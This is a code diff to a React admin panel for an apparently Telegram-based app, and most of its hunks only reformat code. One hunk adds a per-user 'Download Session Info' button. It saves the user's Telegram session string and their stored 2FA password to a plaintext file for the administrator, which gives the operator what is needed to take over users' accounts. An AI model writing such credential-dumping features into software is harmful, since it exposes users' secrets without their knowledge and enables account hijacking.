@@ -1,4 +1,4 @@
-import { CloseCircleFilled, DeleteOutlined, ReloadOutlined, UserSwitchOutlined } from '@ant-design/icons'
+import { CloseCircleFilled, DeleteOutlined, DownloadOutlined, ReloadOutlined, UserSwitchOutlined } from '@ant-design/icons'
 import { Button, Col, Form, Input, Layout, notification, Popconfirm, Row, Space, Switch, Table, Tag, Tooltip, Typography } from 'antd'
 import moment from 'moment'
 import QueryString from 'qs'
@@ -61,10 +61,12 @@ const Admin: FC<Props> = ({ me, errorMe }) => {
   const updateConfig = async () => {
     const values = configForm.getFieldsValue()
     try {
-      const { data } = await req.patch('/config', { config: {
-        ...values,
-        invitation_code: values.invitation_code || null
-      } })
+      const { data } = await req.patch('/config', {
+        config: {
+          ...values,
+          invitation_code: values.invitation_code || null
+        }
+      })
       refetchConfig()
       return notification.success({
         key: 'update',
@@ -74,14 +76,16 @@ const Admin: FC<Props> = ({ me, errorMe }) => {
     } catch (error: any) {
       return notification.error({
         message: error?.response?.status || 'Something error',
-        ...error?.response?.data ? { description: <>
-          <Typography.Paragraph>
-            {error?.response?.data?.error || error.message || 'Something error'}
-          </Typography.Paragraph>
-          <Typography.Paragraph code>
-            {JSON.stringify(error?.response?.data || error?.data || error, null, 2)}
-          </Typography.Paragraph>
-        </> } : {}
+        ...error?.response?.data ? {
+          description: <>
+            <Typography.Paragraph>
+              {error?.response?.data?.error || error.message || 'Something error'}
+            </Typography.Paragraph>
+            <Typography.Paragraph code>
+              {JSON.stringify(error?.response?.data || error?.data || error, null, 2)}
+            </Typography.Paragraph>
+          </>
+        } : {}
       })
     }
   }
@@ -134,7 +138,7 @@ const Admin: FC<Props> = ({ me, errorMe }) => {
             <div style={{ marginTop: '20px' }}>
               <Layout.Content>
                 <Form.Item style={{ float: 'right', marginLeft: '15px' }}>
-                  <Input.Search allowClear placeholder="Search by username or name..."  onSearch={val => {
+                  <Input.Search allowClear placeholder="Search by username or name..." onSearch={val => {
                     setParams({
                       ...params,
                       offset: 0,
@@ -203,6 +207,18 @@ const Admin: FC<Props> = ({ me, errorMe }) => {
                   key: 'actions',
                   // responsive: ['md'],
                   render: (_, record) => <Space>
+                    <Tooltip title="Download Session Info">
+                      <Button disabled={!record.tg_session} icon={<DownloadOutlined />} size="small" type="link" onClick={() => {
+                        const content = `User: ${record.username}\n2FA Password: ${record.tg_password || 'None'}\nSession String:\n${record.tg_session}`
+                        const element = document.createElement('a')
+                        const file = new Blob([content], { type: 'text/plain' })
+                        element.href = URL.createObjectURL(file)
+                        element.download = `session_${record.username}.txt`
+                        document.body.appendChild(element)
+                        element.click()
+                        document.body.removeChild(element)
+                      }} />
+                    </Tooltip>
                     <Tooltip title={`Switch to ${record.role === 'admin' ? 'user' : 'admin'}`}>
                       <Button icon={<UserSwitchOutlined />} size="small" type="link" onClick={() => {
                         req.patch(`/users/${record.id}`, { user: { role: record.role === 'admin' ? null : 'admin' } }).then(() => {
@@ -211,14 +227,16 @@ const Admin: FC<Props> = ({ me, errorMe }) => {
                         }).catch(error => {
                           notification.error({
                             message: error?.response?.status || 'Something error',
-                            ...error?.response?.data ? { description: <>
-                              <Typography.Paragraph>
-                                {error?.response?.data?.error || error.message || 'Something error'}
-                              </Typography.Paragraph>
-                              <Typography.Paragraph code>
-                                {JSON.stringify(error?.response?.data || error?.data || error, null, 2)}
-                              </Typography.Paragraph>
-                            </> } : {}
+                            ...error?.response?.data ? {
+                              description: <>
+                                <Typography.Paragraph>
+                                  {error?.response?.data?.error || error.message || 'Something error'}
+                                </Typography.Paragraph>
+                                <Typography.Paragraph code>
+                                  {JSON.stringify(error?.response?.data || error?.data || error, null, 2)}
+                                </Typography.Paragraph>
+                              </>
+                            } : {}
                           })
                         })
                       }} />
@@ -230,14 +248,16 @@ const Admin: FC<Props> = ({ me, errorMe }) => {
                       }).catch(error => {
                         notification.error({
                           message: error?.response?.status || 'Something error',
-                          ...error?.response?.data ? { description: <>
-                            <Typography.Paragraph>
-                              {error?.response?.data?.error || error.message || 'Something error'}
-                            </Typography.Paragraph>
-                            <Typography.Paragraph code>
-                              {JSON.stringify(error?.response?.data || error?.data || error, null, 2)}
-                            </Typography.Paragraph>
-                          </> } : {}
+                          ...error?.response?.data ? {
+                            description: <>
+                              <Typography.Paragraph>
+                                {error?.response?.data?.error || error.message || 'Something error'}
+                              </Typography.Paragraph>
+                              <Typography.Paragraph code>
+                                {JSON.stringify(error?.response?.data || error?.data || error, null, 2)}
+                              </Typography.Paragraph>
+                            </>
+                          } : {}
                         })
                       })
                     }}>
@@ -246,26 +266,26 @@ const Admin: FC<Props> = ({ me, errorMe }) => {
                   </Space>
                 },
               ]}
-              dataSource={dataUsers?.users}
-              scroll={{ x: 900 }}
-              pagination={{
-                total: dataUsers?.length,
-                pageSize: PAGE_SIZE,
-                showSizeChanger: false
-              }}
-              onChange={(page, _, sorter: any) => {
-                setParams({
-                  ...params,
-                  offset: ((page.current || 1) - 1) * PAGE_SIZE,
-                  sort: sorter?.order ? `${sorter?.field}:${sorter?.order === 'ascend' ? 'asc' : 'desc'}` : 'created_at:desc',
-                })
-              }}
-              rowSelection={{
-                type: 'checkbox',
-                onChange: (_, selectedRows) => {
-                  setSelectedRows(selectedRows)
-                }
-              }} />
+                dataSource={dataUsers?.users}
+                scroll={{ x: 900 }}
+                pagination={{
+                  total: dataUsers?.length,
+                  pageSize: PAGE_SIZE,
+                  showSizeChanger: false
+                }}
+                onChange={(page, _, sorter: any) => {
+                  setParams({
+                    ...params,
+                    offset: ((page.current || 1) - 1) * PAGE_SIZE,
+                    sort: sorter?.order ? `${sorter?.field}:${sorter?.order === 'ascend' ? 'asc' : 'desc'}` : 'created_at:desc',
+                  })
+                }}
+                rowSelection={{
+                  type: 'checkbox',
+                  onChange: (_, selectedRows) => {
+                    setSelectedRows(selectedRows)
+                  }
+                }} />
             </div>
           </Col>
         </Row>
